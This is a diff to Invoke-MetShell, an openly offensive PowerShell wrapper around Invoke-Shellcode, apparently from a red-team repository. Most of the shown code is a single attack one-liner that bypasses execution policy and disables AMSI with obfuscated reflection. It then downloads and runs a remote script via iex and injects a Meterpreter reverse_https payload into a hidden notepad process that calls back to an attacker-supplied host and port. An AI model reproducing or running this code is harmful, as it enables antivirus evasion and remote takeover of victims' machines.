@@ -3,8 +3,8 @@ function Invoke-MetShell
 <#
 .SYNOPSIS
 	A wrapper for the well known Invoke-Shellcode. Spawn a win32 notepad hidden process, check the 
-    architecture of the curret PowerShell session and the spawn a Win32 Powershell if needed to inject 
-    the shellcode.  
+    	architecture of the curret PowerShell session and the spawn a Win32 Powershell if needed to inject 
+    	the shellcode.  
 .DESCRIPTION
 	Author: @b4rtik
 	License: BSD 3-Clause
@@ -69,7 +69,7 @@ function Invoke-MetShell
     if ($env:Processor_Architecture -ne "x86")
     { 
         write-warning 'Run x86 PowerShell'
-        &"c:\Windows\syswow64\windowspowershell\v1.0\powershell.exe" -noni -noprofile -Execution bypass "[Ref].Assembly.GetType('System.M'+'ana'+'gement.Automation.A'+'msi'+'Uti'+'ls').""GetF``ield""('ams'+'iIni'+'tFa'+'iled','Non'+'Public,Static').SetValue(`$null,`$true);iex((New-Object system.net.webclient).DownloadString('https://raw.githubusercontent.com/b4rtik/PowerTheShell/master/Scripts/Invoke-ShellCode.ps1'));Invoke-Shellcode -ProcessId $procId -Payload windows/meterpreter/reverse_https -Lhost $lhost -Lport $lport -Verbose -Force;exit;"
+        &"c:\Windows\syswow64\windowspowershell\v1.0\powershell.exe" -noni -noprofile -Execution bypass "[Ref].Assembly.GetType('System.M'+'ana'+'gement.Automation.A'+'msi'+'Uti'+'ls').'GetF``ield'('ams'+'iIni'+'tFa'+'iled','Non'+'Public,Static').SetValue(`$null,`$true);iex((New-Object system.net.webclient).DownloadString('https://raw.githubusercontent.com/b4rtik/PowerTheShell/master/Scripts/Invoke-ShellCode.ps1'));Invoke-Shellcode -ProcessId $procId -Payload windows/meterpreter/reverse_https -Lhost $lhost -Lport $lport -Verbose -Force;exit;"
     }
     else
     { 
